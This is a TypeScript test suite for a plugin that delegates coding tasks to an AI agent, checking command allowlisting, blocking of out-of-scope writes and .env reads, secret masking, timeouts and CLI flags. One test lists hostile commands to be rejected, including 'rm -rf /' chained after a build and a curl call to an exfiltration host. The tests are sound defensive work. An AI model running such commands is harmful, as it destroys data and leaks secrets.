import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PassThrough } from 'node:stream';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  getArtifactsDir,
  readManifest,
  writeManifest,
  writeReportMarkdown,
} from '../src/bridge-fs.js';
import {
  ApiWorkerEngine,
  ModelTurnResponse,
  validateCommandPolicy,
} from '../src/engines/api-worker.js';
import {
  attachStreamJsonHeartbeat,
  buildCliInvocationArgs,
  buildCliSpawnSpec,
  parseAgyAgentsOutput,
  parseAgyModelsOutput,
  SubscriptionEngine,
} from '../src/engines/subscription.js';
import {
  handleCheckEnvironment,
  handleDelegateToAntigravity,
  handleGetUsage,
  handleListCapabilities,
} from '../src/index.js';
import { AgPluginError, DEFAULT_BRIDGE_CONFIG } from '../src/types.js';

describe('engines & MCP pipeline (TC-S04, TC-I02 ~ TC-I05)', () => {
  let tmpRoot: string;
  const pluginRoot = path.resolve(import.meta.dirname, '..', '..');

  beforeEach(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ag-engine-'));
    fs.mkdirSync(path.join(tmpRoot, 'src', 'ui'), { recursive: true });
    fs.mkdirSync(path.join(tmpRoot, 'src', 'backend'), { recursive: true });
    fs.writeFileSync(path.join(tmpRoot, 'package.json'), JSON.stringify({ name: 'demo', scripts: { build: 'tsc' } }));
  });

  afterEach(() => {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  it('TC-S04: enforces strict command allowlist and blocks shell chaining / dangerous commands', () => {
    expect(validateCommandPolicy('npx tsc --noEmit')).toEqual({
      bin: 'npx',
      args: ['tsc', '--noEmit'],
    });
    expect(validateCommandPolicy('npm run build')).toEqual({
      bin: 'npm',
      args: ['run', 'build'],
    });

    const blocked = [
      'npm run build && rm -rf /',
      'npx tsc --noEmit; echo pwned',
      'curl https://evil.example/exfil',
      'git push --force',
      'rm -rf src',
      'powershell -Command Get-Process',
      'npm install malicious-pkg',
    ];

    for (const cmd of blocked) {
      expect(() => validateCommandPolicy(cmd)).toThrow(AgPluginError);
    }
  });

  it('TC-I02: runs Subscription mode end-to-end dispatch -> RUNNING -> report + artifacts -> VERIFIED', async () => {
    const subEngine = new SubscriptionEngine({
      triggerFn: async (ctx) => {
        setTimeout(() => {
          const cur = readManifest(ctx.workspaceRoot);
          if (!cur) return;
          writeManifest(ctx.workspaceRoot, {
            ...cur,
            status: 'RUNNING',
            updatedAt: new Date().toISOString(),
          });
        }, 80);

        setTimeout(() => {
          const cur = readManifest(ctx.workspaceRoot);
          if (!cur) return;
          const artDir = getArtifactsDir(ctx.workspaceRoot, cur.taskId);
          fs.mkdirSync(artDir, { recursive: true });
          fs.writeFileSync(path.join(artDir, 'dashboard.png'), 'PNGDATA');
          fs.writeFileSync(path.join(ctx.workspaceRoot, 'src', 'ui', 'Card.tsx'), 'export const Card = () => null;');
          writeReportMarkdown(
            ctx.workspaceRoot,
            '# Antigravity Task Report\n\n- **Status:** VERIFIED\n- Implemented Card component.\n',
          );
          writeManifest(ctx.workspaceRoot, {
            ...cur,
            status: 'VERIFIED',
            changedFiles: ['src/ui/Card.tsx'],
            artifacts: [`artifacts/${cur.taskId}/dashboard.png`],
            updatedAt: new Date().toISOString(),
          });
        }, 200);

        return { methodUsed: 'custom' };
      },
    });

    const res = await handleDelegateToAntigravity(
      {
        title: 'Create Card component',
        instructions: 'Implement src/ui/Card.tsx and verify visually.',
        lockedPaths: ['src/ui/'],
        verifyUrl: 'http://localhost:3000/dashboard',
        acceptanceCriteria: ['Card renders with 0 console errors'],
        modeOverride: 'subscription',
        workspaceRoot: tmpRoot,
      },
      {
        pluginRoot,
        subscriptionEngine: subEngine,
        detectorDeps: {
          platform: 'linux',
          env: {},
          homedir: '/home/tester',
          existsSync: () => false,
          findBinary: (name) => (name === 'agy' ? '/usr/local/bin/agy' : undefined),
        },
      },
    );

    expect(res.ok).toBe(true);
    expect(res.mode).toBe('subscription');
    expect(res.status).toBe('VERIFIED');
    expect(res.changedFiles).toContain('src/ui/Card.tsx');
    expect(res.artifacts.some((a) => a.endsWith('dashboard.png'))).toBe(true);
    expect(res.reportMarkdown).toContain('Implemented Card component');
  });

  it('TC-I03: times out cleanly in Subscription mode and transitions manifest to FAILED(TASK_TIMEOUT)', async () => {
    fs.mkdirSync(path.join(tmpRoot, '.ag-bridge'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpRoot, '.ag-bridge', 'config.json'),
      JSON.stringify({ subscription: { timeout_sec: 1, poll_interval_ms: 150 } }),
    );

    const subEngine = new SubscriptionEngine({
      triggerFn: async () => ({ methodUsed: 'custom' }),
    });

    const res = await handleDelegateToAntigravity(
      {
        title: 'Timeout scenario',
        instructions: 'Wait until timeout triggers.',
        lockedPaths: ['src/ui/'],
        acceptanceCriteria: ['Should time out cleanly'],
        modeOverride: 'subscription',
        workspaceRoot: tmpRoot,
      },
      {
        pluginRoot,
        subscriptionEngine: subEngine,
        detectorDeps: {
          platform: 'linux',
          env: {},
          homedir: '/home/tester',
          existsSync: () => false,
          findBinary: (name) => (name === 'agy' ? '/usr/local/bin/agy' : undefined),
        },
      },
    );

    expect(res.ok).toBe(false);
    expect(res.status).toBe('FAILED');
    expect(res.errorCode).toBe('TASK_TIMEOUT');
    expect(readManifest(tmpRoot)?.status).toBe('FAILED');
  });

  it('TC-I04: runs API Worker 5-turn mock Gemini loop, blocks out-of-scope write, and writes report.md', async () => {
    const turns: ModelTurnResponse[] = [
      { functionCalls: [{ name: 'list_dir', args: { path: 'src' } }] },
      {
        functionCalls: [
          {
            name: 'write_file',
            args: { path: 'src/ui/Header.tsx', content: 'export const Header = () => "<header/>";\n' },
          },
        ],
      },
      {
        // Out-of-scope write attempt — must be blocked gracefully
        functionCalls: [
          {
            name: 'write_file',
            args: { path: 'src/backend/auth.ts', content: 'export const hacked = true;\n' },
          },
        ],
      },
      {
        functionCalls: [{ name: 'run_command', args: { command: 'npx tsc --noEmit' } }],
      },
      {
        text: 'Implemented Header component inside src/ui/Header.tsx and verified TypeScript compilation.',
      },
    ];

    let turnIdx = 0;
    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => turns[turnIdx++] ?? { text: 'Done' },
      }),
      commandRunner: async () => ({
        exitCode: 0,
        stdout: '0 errors',
        stderr: '',
        timedOut: false,
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    const mockKey = ['AIza', 'SyTestMockApiKey1234567890abcdef'].join('');
    process.env.GEMINI_API_KEY = mockKey;
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Build Header component',
          instructions: 'Create src/ui/Header.tsx and verify tsc.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Header exported', 'npx tsc --noEmit passes'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: mockKey },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(true);
      expect(res.mode).toBe('api');
      expect(res.status).toBe('VERIFIED');
      expect(fs.existsSync(path.join(tmpRoot, 'src', 'ui', 'Header.tsx'))).toBe(true);
      expect(fs.existsSync(path.join(tmpRoot, 'src', 'backend', 'auth.ts'))).toBe(false);
      expect(res.reportMarkdown).toContain('Blocked 1 out-of-scope write attempt');
      expect(res.reportMarkdown).not.toContain(mockKey);
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('TC-I05: stops cleanly with MAX_TURNS_EXCEEDED when model keeps issuing tool calls', async () => {
    fs.mkdirSync(path.join(tmpRoot, '.ag-bridge'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpRoot, '.ag-bridge', 'config.json'),
      JSON.stringify({ api: { max_turns: 3 } }),
    );

    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => ({
          functionCalls: [{ name: 'list_dir', args: { path: '.' } }],
        }),
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    const mockKey = ['AIza', 'SyTestMockApiKey1234567890abcdef'].join('');
    process.env.GEMINI_API_KEY = mockKey;
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Infinite loop guard test',
          instructions: 'Test max_turns enforcement.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Terminates safely at max_turns'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: mockKey },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(false);
      expect(res.status).toBe('FAILED');
      expect(res.errorCode).toBe('MAX_TURNS_EXCEEDED');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('builds official agy non-interactive CLI flags and legacy antigravity workflow flags', () => {
    const baseCtx = {
      workspaceRoot: tmpRoot,
      pluginRoot,
      manifest: {
        schemaVersion: 1 as const,
        taskId: 'ag-cli-flags-1',
        title: 'CLI flags test',
        mode: 'subscription' as const,
        status: 'DISPATCHED' as const,
        lockedPaths: ['src/ui/'],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        artifacts: [],
      },
      config: DEFAULT_BRIDGE_CONFIG,
      instructions: 'Build UI',
      acceptanceCriteria: ['Works'],
    };

    const agyArgs = buildCliInvocationArgs({
      ...baseCtx,
      detection: {
        configuredMode: 'auto',
        resolvedMode: 'subscription',
        platform: 'win32',
        subscription: {
          detected: true,
          cliBinary: 'agy',
          cliPath: 'C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe',
          triggerMethod: 'cli_or_ipc',
        },
        api: {
          configured: false,
          source: 'none',
          envVarName: 'GEMINI_API_KEY',
          model: 'gemini-2.5-pro',
          maxTurns: 15,
        },
        recommendations: [],
      },
    });
    expect(agyArgs[0]).toBe('--print');
    expect(agyArgs[1]).toContain('/claude-handoff');
    expect(agyArgs).toContain('--mode');
    expect(agyArgs).toContain('accept-edits');
    expect(agyArgs).toContain('--print-timeout');
    expect(agyArgs).toContain('300s');
    expect(agyArgs).toContain('--sandbox');
    expect(agyArgs).toContain('--output-format');
    expect(agyArgs).toContain('stream-json');

    const agyNoStreamArgs = buildCliInvocationArgs({
      ...baseCtx,
      config: {
        ...DEFAULT_BRIDGE_CONFIG,
        subscription: { ...DEFAULT_BRIDGE_CONFIG.subscription, agy_stream_heartbeat: false },
      },
      detection: {
        configuredMode: 'auto',
        resolvedMode: 'subscription',
        platform: 'win32',
        subscription: {
          detected: true,
          cliBinary: 'agy',
          cliPath: 'C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe',
          triggerMethod: 'cli_or_ipc',
        },
        api: {
          configured: false,
          source: 'none',
          envVarName: 'GEMINI_API_KEY',
          model: 'gemini-2.5-pro',
          maxTurns: 15,
        },
        recommendations: [],
      },
    });
    expect(agyNoStreamArgs).not.toContain('stream-json');

    const legacyArgs = buildCliInvocationArgs({
      ...baseCtx,
      detection: {
        configuredMode: 'auto',
        resolvedMode: 'subscription',
        platform: 'darwin',
        subscription: {
          detected: true,
          cliBinary: 'antigravity',
          cliPath: '/usr/local/bin/antigravity',
          triggerMethod: 'cli_or_ipc',
        },
        api: {
          configured: false,
          source: 'none',
          envVarName: 'GEMINI_API_KEY',
          model: 'gemini-2.5-pro',
          maxTurns: 15,
        },
        recommendations: [],
      },
    });
    expect(legacyArgs).toEqual(['run', '--workflow', 'claude-handoff']);

    // Windows .cmd/.bat spawn spec must wrap via cmd.exe /d /s /c with outer quotes + windowsVerbatimArguments
    // The wrapper shell is an absolute path (TC-S15): a bare cmd.exe is looked up on PATH.
    const winCmdSpec = buildCliSpawnSpec(
      'C:\\Program Files\\Antigravity\\bin\\antigravity.cmd',
      legacyArgs,
      'win32',
      { ComSpec: 'C:\\WINDOWS\\system32\\cmd.exe' },
    );
    expect(winCmdSpec.command).toBe('C:\\WINDOWS\\system32\\cmd.exe');
    expect(winCmdSpec.windowsVerbatimArguments).toBe(true);
    expect(winCmdSpec.args.slice(0, 3)).toEqual(['/d', '/s', '/c']);
    expect(winCmdSpec.args[3]).toBe(
      '""C:\\Program Files\\Antigravity\\bin\\antigravity.cmd" "run" "--workflow" "claude-handoff""',
    );

    const winExeSpec = buildCliSpawnSpec('C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe', agyArgs, 'win32');
    expect(winExeSpec.command).toBe('C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe');
    expect(winExeSpec.args).toEqual(agyArgs);
  });

  it('TC-U12: attachStreamJsonHeartbeat parses split NDJSON, updates manifest heartbeat, masks logs, and never overwrites VERIFIED', () => {
    const initialTime = '2026-01-01T00:00:00.000Z';
    writeManifest(tmpRoot, {
      schemaVersion: 1,
      taskId: 'ag-hb-1',
      title: 'Stream heartbeat test',
      mode: 'subscription',
      status: 'DISPATCHED',
      lockedPaths: ['src/ui/'],
      createdAt: initialTime,
      updatedAt: initialTime,
      artifacts: [],
    });

    const logFilePath = path.join(getArtifactsDir(tmpRoot, 'ag-hb-1'), 'agy-cli.log');
    const stream = new PassThrough();
    const seenEvents: Array<Record<string, unknown>> = [];

    const handle = attachStreamJsonHeartbeat(stream, {
      workspaceRoot: tmpRoot,
      taskId: 'ag-hb-1',
      logFilePath,
      minHeartbeatIntervalMs: 0,
      onEvent: (ev) => seenEvents.push(ev),
    });

    // Feed split JSON chunks + malformed non-JSON line + synthetic secret token
    const syntheticLeak = ['AIza', 'SySecretTokenLeakTest1234567890'].join('');
    stream.write('{"type":"turn_start","step":1');
    stream.write(`}\nnot-json-diagnostic-line ${syntheticLeak}\n`);
    stream.write('{"type":"tool_call","name":"write_file"}\n');

    expect(seenEvents.length).toBe(2);
    const updated = readManifest(tmpRoot);
    expect(updated?.status).toBe('RUNNING');
    expect(updated?.updatedAt).not.toBe(initialTime);

    const logContent = fs.readFileSync(logFilePath, 'utf8');
    expect(logContent).toContain('[REDACTED]');
    expect(logContent).not.toContain(syntheticLeak);

    // Mark terminal VERIFIED, then emit late stream event -> must NOT revert to RUNNING
    writeManifest(tmpRoot, {
      ...updated!,
      status: 'VERIFIED',
      updatedAt: '2026-11-22T23:00:00.000Z',
    });
    stream.write('{"type":"late_event"}\n');
    stream.end();
    handle.stop();

    expect(readManifest(tmpRoot)?.status).toBe('VERIFIED');
  });

  it('TC-U14: builds complete agy CLI flags including --dangerously-skip-permissions, model, effort, agent, add-dir, conversation, remote-agent, json-schema', () => {
    const args = buildCliInvocationArgs({
      workspaceRoot: tmpRoot,
      pluginRoot,
      manifest: {
        schemaVersion: 1,
        taskId: 'ag-full-flags-1',
        title: 'Full agy flags test',
        mode: 'subscription',
        status: 'DISPATCHED',
        lockedPaths: ['src/ui/'],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        artifacts: [],
      },
      config: DEFAULT_BRIDGE_CONFIG,
      instructions: 'Inspect and refactor UI components.',
      acceptanceCriteria: ['Clean build'],
      timeoutSecOverride: 180,
      agyOptions: {
        dangerouslySkipPermissions: true,
        sandbox: false,
        model: 'gemini-4-neon-high',
        effort: 'xhigh',
        agent: 'frontend-specialist',
        addDirs: ['../shared-types', '../design-system'],
        conversationId: 'conv-resume-99',
        project: 'my-proj',
        newProject: true,
        remoteAgent: true,
        jsonSchema: '{"type":"object"}',
        disableSlashCommands: true,
        settings: '{"theme":"dark"}',
      },
      detection: {
        configuredMode: 'auto',
        resolvedMode: 'subscription',
        platform: 'win32',
        subscription: {
          detected: true,
          cliBinary: 'agy',
          cliPath: 'C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe',
          triggerMethod: 'cli_or_ipc',
        },
        api: {
          configured: false,
          source: 'none',
          envVarName: 'GEMINI_API_KEY',
          model: 'gemini-2.5-pro',
          maxTurns: 15,
        },
        recommendations: [],
      },
    });

    expect(args).toContain('--dangerously-skip-permissions');
    expect(args).not.toContain('--mode');
    expect(args).not.toContain('--sandbox');
    expect(args).toContain('--model');
    expect(args).toContain('gemini-4-neon-high');
    expect(args).toContain('--effort');
    expect(args).toContain('xhigh');
    expect(args).toContain('--agent');
    expect(args).toContain('frontend-specialist');
    expect(args).toContain('--add-dir');
    expect(args).toContain('../shared-types');
    expect(args).toContain('../design-system');
    expect(args).toContain('--conversation');
    expect(args).toContain('conv-resume-99');
    expect(args).toContain('--project');
    expect(args).toContain('my-proj');
    expect(args).toContain('--new-project');
    expect(args).toContain('--remote-agent');
    expect(args).toContain('--json-schema');
    expect(args).toContain('--disable-slash-commands');
    expect(args).toContain('--settings');
    expect(args).toContain('180s');
    expect(args).toContain('stream-json');
  });

  it('TC-U15: captures official agy init/step_update/result token usage and auto-finalizes manifest & report.md', () => {
    const initialTime = '2026-11-23T00:00:00.000Z';
    writeManifest(tmpRoot, {
      schemaVersion: 1,
      taskId: 'ag-stream-usage-1',
      title: 'Real agy NDJSON schema test',
      mode: 'subscription',
      status: 'DISPATCHED',
      lockedPaths: [],
      createdAt: initialTime,
      updatedAt: initialTime,
      artifacts: [],
    });

    const stream = new PassThrough();
    const handle = attachStreamJsonHeartbeat(stream, {
      workspaceRoot: tmpRoot,
      taskId: 'ag-stream-usage-1',
      minHeartbeatIntervalMs: 0,
      autoFinalizeOnResult: true,
    });

    stream.write(
      `${JSON.stringify({
        event: 'init',
        conversation_id: 'conv-live-777',
        init: { model: 'gemini-4-neon-high', permission_mode: 'always-proceed' },
      })}\n`,
    );
    stream.write(
      `${JSON.stringify({
        event: 'result',
        result: {
          conversation_id: 'conv-live-777',
          status: 'SUCCESS',
          response: 'All checks completed cleanly.',
          duration_seconds: 4.25,
          num_turns: 2,
          usage: {
            input_tokens: 11424,
            output_tokens: 120,
            thinking_tokens: 340,
            cache_read_tokens: 5000,
            total_tokens: 11884,
          },
        },
      })}\n`,
    );
    stream.end();
    handle.stop();

    const finalManifest = readManifest(tmpRoot);
    expect(finalManifest?.status).toBe('VERIFIED');
    expect(finalManifest?.metrics?.conversationId).toBe('conv-live-777');
    expect(finalManifest?.metrics?.model).toBe('gemini-4-neon-high');
    expect(finalManifest?.metrics?.permissionMode).toBe('always-proceed');
    expect(finalManifest?.metrics?.durationSeconds).toBe(4.25);
    expect(finalManifest?.metrics?.numTurns).toBe(2);
    expect(finalManifest?.metrics?.usage?.totalTokens).toBe(11884);
    expect(finalManifest?.metrics?.usage?.thinkingTokens).toBe(340);

    const reportText = fs.readFileSync(path.join(tmpRoot, '.ag-bridge', 'report.md'), 'utf8');
    expect(reportText).toContain('All checks completed cleanly.');
    expect(reportText).toContain('11,884');
  });

  it('TC-U16: aggregates API worker multi-turn token usage and parses agy models/agents output', async () => {
    const models = parseAgyModelsOutput(
      'Fetching available models...\ngemini-4-neon-high\tGemini 4 Neon (High)\nclaude-opus-5-5-high\tClaude Opus 5.5 (High)\n',
    );
    expect(models).toEqual([
      { id: 'gemini-4-neon-high', label: 'Gemini 4 Neon (High)' },
      { id: 'claude-opus-5-5-high', label: 'Claude Opus 5.5 (High)' },
    ]);
    expect(parseAgyAgentsOutput('frontend-specialist\nqa-reviewer\n')).toEqual([
      'frontend-specialist',
      'qa-reviewer',
    ]);

    const cap = await handleListCapabilities(tmpRoot, {
      detectorDeps: {
        platform: 'win32',
        env: {},
        homedir: 'C:\\Users\\tester',
        existsSync: () => false,
        findBinary: (b) => (b === 'agy' ? 'C:\\bin\\agy.exe' : undefined),
      },
      queryCapabilitiesFn: () => ({
        models,
        agents: ['frontend-specialist'],
        warnings: [],
      }),
    });
    expect(cap.models.length).toBe(2);
    expect(cap.agents).toEqual(['frontend-specialist']);

    // Verify API worker accumulates usageMetadata across turns and handleGetUsage returns it
    let turn = 0;
    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => {
          turn += 1;
          if (turn === 1) {
            return {
              functionCalls: [{ name: 'list_dir', args: { path: '.' } }],
              usage: { inputTokens: 1000, outputTokens: 50, thinkingTokens: 100, cacheReadTokens: 0, totalTokens: 1150 },
            };
          }
          return {
            text: 'Summary complete.',
            usage: { inputTokens: 1200, outputTokens: 80, thinkingTokens: 20, cacheReadTokens: 500, totalTokens: 1300 },
          };
        },
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    const usageKey = ['AIza', 'SyUsageTestApiKey1234567890abcdef'].join('');
    process.env.GEMINI_API_KEY = usageKey;
    try {
      const del = await handleDelegateToAntigravity(
        {
          title: 'API token usage test',
          instructions: 'Inspect workspace and summarize.',
          lockedPaths: ['src/ui/'],
          model: 'gemini-2.5-flash',
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: usageKey },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );
      expect(del.ok).toBe(true);
      expect(del.metrics?.model).toBe('gemini-2.5-flash');
      expect(del.metrics?.numTurns).toBe(2);
      expect(del.metrics?.usage?.inputTokens).toBe(2200);
      expect(del.metrics?.usage?.outputTokens).toBe(130);
      expect(del.metrics?.usage?.thinkingTokens).toBe(120);
      expect(del.metrics?.usage?.cacheReadTokens).toBe(500);
      expect(del.metrics?.usage?.totalTokens).toBe(2450);

      const summary = await handleGetUsage(tmpRoot);
      expect(summary.totalTasks).toBe(1);
      expect(summary.totals.totalTokens).toBe(2450);
      expect(summary.byMode.api.tasks).toBe(1);
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('API worker recovers from transient 429 retry, nudges build verification, slices read_file, and blocks .env reads', async () => {
    fs.writeFileSync(path.join(tmpRoot, '.env'), 'TOP_SECRET=do-not-read\n', 'utf8');
    fs.writeFileSync(path.join(tmpRoot, 'src', 'ui', 'types.ts'), 'line1\nline2\nline3\nline4\n', 'utf8');

    let attempts = 0;
    let step = 0;
    let sawBuildNudge = false;
    let sawEnvReadBlocked = false;
    let sawSlicedContent = false;

    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async ({ contents }) => {
          // Inspect previous tool responses & user messages
          const serialized = JSON.stringify(contents);
          if (serialized.includes('PROTECTED_PATH_BLOCKED')) {
            sawEnvReadBlocked = true;
          }
          if (serialized.includes('line2\\nline3')) {
            sawSlicedContent = true;
          }
          if (serialized.includes('Before finalizing, please run `npx tsc --noEmit`')) {
            sawBuildNudge = true;
          }

          // Simulate transient 429 on very first call
          if (attempts < 2) {
            attempts += 1;
            throw new Error('429 RESOURCE_EXHAUSTED transient rate limit');
          }

          step += 1;
          if (step === 1) {
            return {
              functionCalls: [
                { name: 'read_file', args: { path: '.env' } },
                { name: 'read_file', args: { path: 'src/ui/types.ts', startLine: 2, endLine: 3 } },
                { name: 'write_file', args: { path: 'src/ui/Badge.tsx', content: 'export const Badge = () => null;\n' } },
              ],
            };
          }
          if (step === 2) {
            // Try to finish without running build/tsc -> should trigger verification nudge
            return { text: 'Premature done before build check' };
          }
          if (step === 3) {
            return {
              functionCalls: [{ name: 'run_command', args: { command: 'npx tsc --noEmit' } }],
            };
          }
          return { text: 'Verified Badge component after tsc check.' };
        },
      }),
      commandRunner: async () => ({
        exitCode: 0,
        stdout: '0 errors',
        stderr: '',
        timedOut: false,
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    const retryKey = ['AIza', 'SyRetryTestSecretKey1234567890abcd'].join('');
    process.env.GEMINI_API_KEY = retryKey;
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Retry & nudge verification',
          instructions: 'Read types, implement Badge, verify build.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Badge compiles cleanly'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: retryKey },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(true);
      expect(attempts).toBe(2);
      expect(sawEnvReadBlocked).toBe(true);
      expect(sawSlicedContent).toBe(true);
      expect(sawBuildNudge).toBe(true);
      expect(res.reportMarkdown).not.toContain(retryKey);
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('API worker returns masked GEMINI_API_ERROR on non-retryable API failure', async () => {
    const dummyKey = ['AIza', 'SyFatalErrorKey1234567890abcdefg'].join('');
    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => {
          throw new Error(`401 Unauthorized for key ${dummyKey}`);
        },
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = dummyKey;
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Fatal API error test',
          instructions: 'Verify fatal error masking.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Fails cleanly'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: dummyKey },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(false);
      expect(res.errorCode).toBe('GEMINI_API_ERROR');
      expect(res.errorMessage).not.toContain(dummyKey);
      expect(res.errorMessage).toContain('[REDACTED]');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('check_ag_environment returns structured bridge and git status', async () => {
    const envRes = await handleCheckEnvironment(tmpRoot, {
      detectorDeps: {
        platform: 'linux',
        env: {},
        homedir: '/home/tester',
        existsSync: () => false,
        findBinary: () => undefined,
      },
    });
    expect(envRes.resolvedMode).toBe('unavailable');
    expect(envRes.bridge.currentStatus).toBe('IDLE');
    expect(envRes.git.isGitRepo).toBe(false);
  });
});
